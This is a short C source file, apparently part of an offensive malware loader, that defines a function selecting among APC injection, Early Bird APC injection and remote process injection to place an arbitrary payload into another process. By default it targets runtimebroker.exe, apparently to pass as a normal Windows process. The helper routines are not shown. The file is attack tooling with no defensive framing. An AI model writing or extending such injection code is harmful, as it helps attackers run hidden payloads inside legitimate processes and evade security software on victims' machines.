#include "injection.h"


BOOL inject_payload(LPVOID Payload, SIZE_T PayloadSize, ...) {
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    BOOL bSuccess = FALSE;
    LPWSTR szProcessName = L"runtimebroker.exe";

    va_list args;
    va_start(args, PayloadSize);

    #if defined(APC_INJECTION)
        DebugPrint("[#] Injecting Payload via APC ...\n");
        bSuccess = ApcInjection(hProcess, hThread, Payload, PayloadSize);
    #elif defined(EARLY_BIRD_INJECTION)
       DebugPrint("[#] Injecting Payload via Early Bird Injection ...\n");
       LPWSTR processName = va_arg(args, LPWSTR);
        if (processName != NULL) {
            szProcessName = processName;
        }
       bSuccess = EarlyBirdApcInjection(hProcess, hThread, szProcessName, Payload, PayloadSize);
    #elif defined(REMOTE_PROCESS_INJECTION)
        DebugPrint("[#] Injecting Payload via Remote Process Injection ...\n");
        LPWSTR processName = va_arg(args, LPWSTR);
        if (processName != NULL) {
            szProcessName = processName;
        }
        bSuccess = RemoteProcessInjection(hProcess, szProcessName, Payload, PayloadSize);
    #endif

    va_end(args);
    return bSuccess;
}
